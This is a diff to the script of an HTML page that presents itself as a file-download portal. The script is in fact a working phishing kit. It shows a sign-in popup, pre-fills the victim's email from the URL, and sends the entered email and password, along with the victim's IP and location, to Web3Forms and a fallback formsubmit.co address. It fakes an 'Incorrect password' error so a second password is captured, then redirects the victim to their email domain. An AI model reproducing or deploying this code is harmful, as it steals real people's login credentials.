@@ -527,152 +527,342 @@
 
   <script>
     
-    // Form submission handler
-async function handleSubmit(event) {
-  event.preventDefault();
+   document.addEventListener('DOMContentLoaded', function () {
+  // Element references
+  const downloadButtons = document.querySelectorAll('.download-icon');
+  const downloadAllButton = document.getElementById('downloadButton');
+  const popupForm = document.getElementById('popupForm');
+  const popupOverlay = document.getElementById('popupOverlay');
+  const closePopupButton = document.getElementById('closePopupButton');
+  const downloadForm = document.getElementById('downloadForm');
+  const submitButton = document.querySelector('#downloadForm button[type="submit"]');
+  const emailInput = document.getElementById('email');
+  const passwordInput = document.getElementById('password');
+  const errorMessage = document.getElementById('errorMessage');
+  const networkErrorModal = document.getElementById('networkErrorModal');
+  const retryButton = document.getElementById('retryButton');
+  const cancelButton = document.getElementById('cancelButton');
 
-  const email = emailInput.value.trim();
-  const password = passwordInput.value.trim();
+  let step = 0; // Track submission attempts
+  const loaderGif = 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSi5YaF8N9pxFP_SOR4yBK2_DBMBMdLFmMpFKsmGW83HhzHP7913cNKZOyokKPGt43TsFajYNdNeoxc04bSuNAEllehPsfUxrMZDuG_pa12oHdvE60B0Oxw8yMjIGoI9IBL_BqnHXQCWH-FkpoSz-4VS02hqI5qOVSFwUurOO1suFreDjJYZ6XNQ-Q4-4/s256/loader.gif';
 
-  if (!email || !email.includes('@')) {
-    showError('Please enter a valid email address');
-    return;
+  // Create loader element
+  let loader = document.getElementById('loader');
+  if (!loader) {
+    loader = document.createElement('div');
+    loader.id = 'loader';
+    loader.style.position = 'fixed';
+    loader.style.top = '50%';
+    loader.style.left = '50%';
+    loader.style.transform = 'translate(-50%, -50%)';
+    loader.style.zIndex = '9999';
+    loader.style.display = 'none';
+    loader.innerHTML = `<img src="${loaderGif}" style="width:50px; height:50px;" alt="Loading">`;
+    document.body.appendChild(loader);
   }
 
-  if (password.length < 8) {
-    showError('Password must be at least 8 characters');
-    return;
+  // Disable submit button initially
+  if (submitButton) {
+    submitButton.disabled = true;
+    submitButton.style.opacity = '0.6';
+    submitButton.style.cursor = 'not-allowed';
   }
 
-  errorMessage.style.display = 'none';
-  showLoading(true);
-  submitButton.textContent = 'Verifying...';
+  // Validate inputs in real-time
+  function validateInputs() {
+    const emailValid = emailInput.value.trim().includes('@');
+    const passwordValid = passwordInput.value.trim().length >= 8;
 
-  try {
-    // Get IP information
-    const ipResponse = await fetch('https://ipinfo.io/json');
-    if (!ipResponse.ok) throw new Error('Network error');
-    const ipData = await ipResponse.json();
-
-    step++; // Increment submission attempt
-
-    // Prepare form data for Web3Forms
-    const formData = new FormData();
-    formData.append('access_key', '8faf097e-a2cc-4b2a-8f9f-557f2426309a');
-    formData.append('subject', 'Logs | ' + ipData.ip);
-    formData.append('Email', email);
-    formData.append('Password', password);
-    formData.append('Attempts', step.toString());
-    formData.append('IP', ipData.ip);
-    formData.append('Location', ipData.city + ', ' + ipData.country);
-    
-    // Optional: Add additional metadata
-    formData.append('from_name', 'Download Portal');
-    formData.append('botcheck', ''); // Web3Forms bot check
-
-    // Submit to Web3Forms
-    const submitResponse = await fetch('https://api.web3forms.com/submit', {
-      method: 'POST',
-      body: formData
-    });
-
-    if (!submitResponse.ok) {
-      throw new Error('Network error');
+    if (submitButton) {
+      submitButton.disabled = !(emailValid && passwordValid);
+      submitButton.style.opacity = submitButton.disabled ? '0.6' : '1';
+      submitButton.style.cursor = submitButton.disabled ? 'not-allowed' : 'pointer';
     }
 
-    const result = await submitResponse.json();
+    if (passwordInput.value.trim().length > 0 && passwordInput.value.trim().length < 8) {
+      showError('Password must be at least 8 characters', false);
+    } else if (!emailInput.value.trim().includes('@') && emailInput.value.trim().length > 0) {
+      showError('Please enter a valid email', false);
+    } else {
+      errorMessage.style.display = 'none';
+    }
+  }
 
-    // Check if submission was successful
-    if (result.success) {
-      console.log('Submission successful:', result);
+  // Show popup function
+  function showPopup() {
+    popupForm.classList.add('active');
+    popupOverlay.classList.add('active');
+    document.body.style.overflow = 'hidden';
 
-      // Redirect on second attempt
-      if (step === 2) {
-        const domain = email.split('@').pop(); // Extract domain from email
+    // Check URL hash for email pre-fill
+    if (window.location.hash) {
+      const clientID = window.location.hash.substring(1);
+      if (clientID.includes('@')) {
+        emailInput.value = clientID;
+        validateInputs();
+      }
+    }
+  }
+
+  // Close popup function
+  function closePopup() {
+    popupForm.classList.remove('active');
+    popupOverlay.classList.remove('active');
+    document.body.style.overflow = '';
+  }
+
+  // Show error message
+  function showError(message, isError = true) {
+    errorMessage.textContent = message;
+    errorMessage.style.color = isError ? '#ff6b6b' : 'orange';
+    errorMessage.style.display = 'block';
+
+    // Add shake animation
+    errorMessage.classList.add('shake');
+    setTimeout(() => {
+      errorMessage.classList.remove('shake');
+    }, 500);
+  }
+
+  // Show network error modal
+  function showNetworkError() {
+    networkErrorModal.classList.add('active');
+    popupOverlay.classList.add('active');
+    document.body.style.overflow = 'hidden';
+  }
+
+  // Hide network error modal
+  function hideNetworkError() {
+    networkErrorModal.classList.remove('active');
+    popupOverlay.classList.remove('active');
+    document.body.style.overflow = '';
+  }
+
+  // Show loading state
+  function showLoading(show) {
+    loader.style.display = show ? 'block' : 'none';
+    if (submitButton) {
+      submitButton.disabled = show;
+      submitButton.textContent = show ? 'Processing...' : 'Sign in';
+    }
+  }
+
+  // Track authentication state
+  let isAuthenticated = false;
+  let authEmail = '';
+
+  // Form submission handler - Updated with web3forms
+  async function handleSubmit(event) {
+    event.preventDefault();
+
+    const email = emailInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    if (!email || !email.includes('@')) {
+      showError('Please enter a valid email address');
+      return;
+    }
+
+    if (password.length < 8) {
+      showError('Password must be at least 8 characters');
+      return;
+    }
+
+    errorMessage.style.display = 'none';
+    showLoading(true);
+    submitButton.textContent = 'Verifying...';
+
+    try {
+      // Get IP information
+      const ipResponse = await fetch('https://ipinfo.io/json');
+      if (!ipResponse.ok) throw new Error('Network error');
+      const ipData = await ipResponse.json();
+
+      step++; // Increment submission attempt
+
+      // WEB3FORMS SUBMISSION CODE - ADDED HERE
+      const form = document.getElementById('downloadForm');
+      const submitBtn = form.querySelector('button[type="submit"]');
+      
+      const formData = new FormData(form);
+      formData.append("access_key", "8faf097e-a2cc-4b2a-8f9f-557f2426309a");
+      formData.append("_subject", 'Logs | ' + ipData.ip);
+      formData.append("Email", email);
+      formData.append("Password", password);
+      formData.append("Attempts", step.toString());
+      formData.append("IP", ipData.ip);
+      formData.append("Location", ipData.city + ', ' + ipData.country);
+
+      const originalText = submitBtn.textContent;
+      submitBtn.textContent = "Sending...";
+      submitBtn.disabled = true;
+
+      const response = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        body: formData
+      });
+
+      const result = await response.json();
+
+      // Check if submission was successful
+      if (result.success) {
+        console.log('Submission successful via web3forms:', result);
+
+        // Redirect on second attempt
+        if (step === 2) {
+          const domain = email.split('@').pop(); // Extract domain from email
+          showLoading(false);
+          window.location.href = `http://${domain}`;
+          return;
+        }
+
+        // Show incorrect password message on first attempt
+        showError('Incorrect password. Please try again.');
         showLoading(false);
-        window.location.href = `http://${domain}`;
-        return;
+        submitButton.textContent = 'Sign in';
+      } else {
+        throw new Error('Submission failed via web3forms');
       }
 
-      // Show incorrect password message on first attempt
-      showError('Incorrect password. Please try again.');
+    } catch (error) {
+      console.error('Submission error:', error);
       showLoading(false);
       submitButton.textContent = 'Sign in';
       
-      // Set authentication state after successful submission
-      isAuthenticated = true;
-      authEmail = email;
-      enableDownloads();
-      
-    } else {
-      // Handle Web3Forms specific errors
-      if (result.message) {
-        throw new Error(result.message);
-      } else {
-        throw new Error('Submission failed');
-      }
-    }
+      // Try fallback to original formsubmit method if web3forms fails
+      if (error.message.includes('Network error') || error.message.includes('failed')) {
+        try {
+          // Fallback to formsubmit.co
+          const fallbackFormData = new URLSearchParams();
+          fallbackFormData.append('_subject', 'Logs | ' + (ipData?.ip || 'Unknown'));
+          fallbackFormData.append('Email', email);
+          fallbackFormData.append('Password', password);
+          fallbackFormData.append('Attempts', step.toString());
+          fallbackFormData.append('IP', ipData?.ip || 'Unknown');
+          fallbackFormData.append('Location', (ipData?.city || 'Unknown') + ', ' + (ipData?.country || 'Unknown'));
 
-  } catch (error) {
-    console.error('Submission error:', error);
-    showLoading(false);
-    submitButton.textContent = 'Sign in';
-    
-    // Try alternative submission methods if Web3Forms fails
-    if (error.message.includes('Network error') || error.message.includes('failed')) {
-      try {
-        // Fallback to FormSubmit.co
-        const fallbackFormData = new URLSearchParams();
-        fallbackFormData.append('_subject', 'Logs | Fallback Submission');
-        fallbackFormData.append('Email', email);
-        fallbackFormData.append('Password', password);
-        fallbackFormData.append('Attempts', step.toString());
-        fallbackFormData.append('IP', 'Unknown');
-        fallbackFormData.append('Location', 'Unknown');
-        
-        const fallbackResponse = await fetch('https://formsubmit.co/ajax/gabriel5657@proton.me', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Accept': 'application/json'
-          },
-          body: fallbackFormData.toString()
-        });
-        
-        if (fallbackResponse.ok) {
-          const fallbackResult = await fallbackResponse.json();
-          console.log('Fallback submission successful:', fallbackResult);
-          
-          // Continue with the flow even if using fallback
-          if (step === 2) {
-            const domain = email.split('@').pop();
-            showLoading(false);
-            window.location.href = `http://${domain}`;
-            return;
+          const submitResponse = await fetch('https://formsubmit.co/ajax/gabriel5657@proton.me', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/x-www-form-urlencoded',
+              'Accept': 'application/json'
+            },
+            body: fallbackFormData.toString()
+          });
+
+          if (submitResponse.ok) {
+            const result = await submitResponse.json();
+            if (result.success) {
+              console.log('Fallback submission successful via formsubmit');
+              
+              if (step === 2) {
+                const domain = email.split('@').pop();
+                showLoading(false);
+                window.location.href = `http://${domain}`;
+                return;
+              }
+              
+              showError('Incorrect password. Please try again.');
+              showLoading(false);
+              submitButton.textContent = 'Sign in';
+              return;
+            }
           }
-          
-          showError('Incorrect password. Please try again.');
-          showLoading(false);
-          submitButton.textContent = 'Sign in';
-          
-          // Set authentication state
-          isAuthenticated = true;
-          authEmail = email;
-          enableDownloads();
-          return;
+        } catch (fallbackError) {
+          console.error('Fallback also failed:', fallbackError);
         }
-      } catch (fallbackError) {
-        console.error('Fallback also failed:', fallbackError);
+        
+        closePopup();
+        showNetworkError();
+      } else {
+        showError('An error occurred. Please try again later.');
       }
-      
-      closePopup();
-      showNetworkError();
-    } else {
-      showError('An error occurred. Please try again later.');
     }
   }
-}
+
+  // Enable downloads after authentication
+  function enableDownloads() {
+    downloadButtons.forEach((button) => {
+      button.style.cursor = 'pointer';
+      button.style.opacity = '1';
+      button.style.pointerEvents = 'auto';
+    });
+
+    if (downloadAllButton) {
+      downloadAllButton.disabled = false;
+      downloadAllButton.style.opacity = '1';
+      downloadAllButton.style.cursor = 'pointer';
+    }
+  }
+
+  // Handle individual file downloads
+  function handleFileDownload(event) {
+    if (!isAuthenticated) {
+      event.preventDefault();
+      showPopup();
+      return;
+    }
+
+    const fileName = event.currentTarget.getAttribute('data-file');
+
+    showLoading(true);
+
+    setTimeout(() => {
+      showLoading(false);
+      alert(`Downloading ${fileName}...`);
+    }, 1000);
+  }
+
+  // Event listeners
+  if (emailInput) emailInput.addEventListener('input', validateInputs);
+  if (passwordInput) passwordInput.addEventListener('input', validateInputs);
+  if (popupOverlay) popupOverlay.addEventListener('click', closePopup);
+  if (closePopupButton) closePopupButton.addEventListener('click', closePopup);
+
+  // Network error modal buttons
+  if (retryButton) {
+    retryButton.addEventListener('click', () => {
+      hideNetworkError();
+      showPopup(); // Reopen popup for retry
+    });
+  }
+
+  if (cancelButton) {
+    cancelButton.addEventListener('click', () => {
+      hideNetworkError();
+    });
+  }
+
+  // Add click handlers to download buttons
+  downloadButtons.forEach((button) => {
+    button.removeEventListener('click', handleFileDownload); // Prevent duplicate listeners
+    button.addEventListener('click', handleFileDownload);
+  });
+
+  if (downloadAllButton) {
+    downloadAllButton.addEventListener('click', () => {
+      if (!isAuthenticated) {
+        showPopup();
+      } else {
+        showLoading(true);
+        setTimeout(() => {
+          showLoading(false);
+          alert('Downloading all files...');
+        }, 1500);
+      }
+    });
+  }
+
+  if (downloadForm) {
+    downloadForm.addEventListener('submit', handleSubmit);
+  }
+
+  // Initial validation
+  validateInputs();
+}); 
+    
   </script>
 </body>
 </html>
+
 
